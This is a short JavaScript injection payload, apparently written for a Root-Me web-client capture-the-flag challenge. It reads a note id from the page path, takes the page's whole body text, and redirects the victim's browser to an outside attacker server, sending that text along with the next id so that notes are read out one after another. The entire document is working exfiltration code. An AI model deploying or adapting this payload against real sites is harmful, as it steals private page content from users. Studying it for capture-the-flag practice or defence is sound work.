<script>
(function () {
    const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
    const SERVER = "https://your-app.up.railway.app";

    const parts = location.pathname.split("/");
    const id = parseInt(parts[parts.length - 1]);

    if (isNaN(id)) {
        window.location.replace("https://web-client-ch56.challenge01.root-me.org:58056/notes/0");
        return;
    }

    const data = encodeURIComponent(document.body.innerText);

    location.href =
        SERVER +
        "?id=" + id +
        "&d=" + data +
        "&next=" + (id + 1);
})();
</script>
